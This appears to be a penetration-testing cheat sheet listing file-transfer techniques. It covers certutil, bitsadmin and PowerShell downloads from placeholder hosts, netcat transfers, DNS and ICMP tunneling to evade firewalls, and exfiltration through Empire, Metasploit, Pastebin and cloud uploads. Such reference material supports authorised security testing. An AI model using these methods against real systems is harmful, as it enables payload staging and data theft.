## **Windows Built-in Tools**

1. **PowerShell**
    
    - **Command**: `Invoke-WebRequest` or `Invoke-Expression`
    - Example:
        
        ```powershell
        Invoke-WebRequest -Uri http://<IP>/<file> -OutFile <file>
        ```
        
    - Usage: Download files directly from HTTP/HTTPS servers.
    
2. **certutil**
    
    - **Command**: `certutil -urlcache -split -f http://<IP>/<file> <file>`
    - Usage: A built-in utility that can download files over HTTP/HTTPS.
    
3. **bitsadmin**
    
    - **Command**: `bitsadmin /transfer myJob /download /priority high http://<IP>/<file> C:\path\to\file`
    - Usage: Used to download files stealthily over HTTP/HTTPS.

---

## **Linux Built-in Tools**

4. **scp (Secure Copy Protocol)**
    
    - **Command**: `scp user@<IP>:<remote-file> <local-path>`
    - Usage: Transfer files securely over SSH.
    
5. **wget**
    
    - **Command**: `wget http://<IP>/<file>`
    - Usage: Download files directly from HTTP/HTTPS servers.
    
6. **curl**
    
    - **Command**: `curl -O http://<IP>/<file>`
    - Usage: Flexible tool to download files.
    
7. **nc (Netcat)**
    
    - **Server**: `nc -lvp <port> < <file>`
    - **Client**: `nc <IP> <port> > <file>`
    - Usage: Simple way to transfer files over raw TCP.
    
8. **rsync**
    
    - **Command**: `rsync -avz user@<IP>:<file> <local-path>`
    - Usage: Sync files efficiently between systems.

---

## **Cross-Platform Tools**

9. **FTP**
    
    - **Command**: `ftp <IP>`
    - Usage: Upload/download files using FTP protocol.
    
10. **HTTP Server**
    
    - Python:
        
        ```bash
        python3 -m http.server <port>
        ```
        
    - Transfer using browser or tools like `wget`/`curl`.
    
11. **SMB (Samba)**
    
    - Using `smbclient`:
        
        ```bash
        smbclient //IP/share -U user put <file>
        ```
        
    - Usage: Transfer files via SMB.
    
12. **HTTP File Servers**
    
    - **SimpleHTTPServer (Python 2):**
        
        ```bash
        python -m SimpleHTTPServer <port>
        ```
        
    - **PHP:**
        
        ```bash
        php -S 0.0.0.0:<port>
        ```
    
13. **TFTP (Trivial File Transfer Protocol)**
    
    - **Server**: `atftpd --daemon /path/to/files`
    - **Client**: `tftp <IP> -c get <file>`
    - Usage: Lightweight file transfer for limited environments.
    
14. **Impacket's smbserver.py**
    
    - **Command**:
    
        ```bash
        smbserver.py share /path/to/files
        ```
        
    - Usage: Share files over SMB without installing Samba.
    
15. **HTTPUpload**
    
    - **Command**: Use tools like `curl` or `nc` to upload files directly to a listening HTTP/HTTPS server.

---

## **Stealth Tools**

16. **DNS Tunneling**
    
    - Tools: `dnscat2`, `iodine`
    - Usage: Transfer files using DNS queries to evade firewalls.
    
17. **ICMP Tunneling**
    
    - Tools: `ptunnel`, `icmptx`
    - Usage: Send data using ICMP echo requests (ping).
    
18. **Powershell Transfer with Base64 Encoding**
    
    - Encode file in Base64:
        
        ```powershell
        $content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("<file>"))
        ```
        
    - Decode and save on target.
    
19. **WebDAV (via Kali)**
    
    - **Command**:
    
        ```bash
        davtest -url http://<IP>
        ```
        
    - Usage: Upload files via WebDAV to a writable directory.

---

## **Third-Party Tools**

20. **Exfiltration Tools**
    
    - **Empire**: Offers modules to exfiltrate files during engagements.
    - **Metasploit Upload/Download**: Use sessions to upload/download files.
    
21. **Magic-Wormhole**
    
    - **Command**: `wormhole send <file>`
    - Usage: Send files securely via a short code.
    
22. **Croc**
    
    - **Command**: `croc send <file>`
    - Usage: Secure and easy file sharing.
    
23. **Rclone**
    
    - **Command**: Sync with cloud providers like Google Drive or S3.

---

## **Cloud-Based Transfers**

24. **Dropbox/GDrive Upload Scripts**
    
    - Use APIs or CLI tools to upload files to cloud storage.
    
25. **Pastebin/Gist**
    
    - Upload file contents and share via link.

---

These tools and methods are staples in penetration testing engagements, allowing flexibility depending on the environment and constraints.
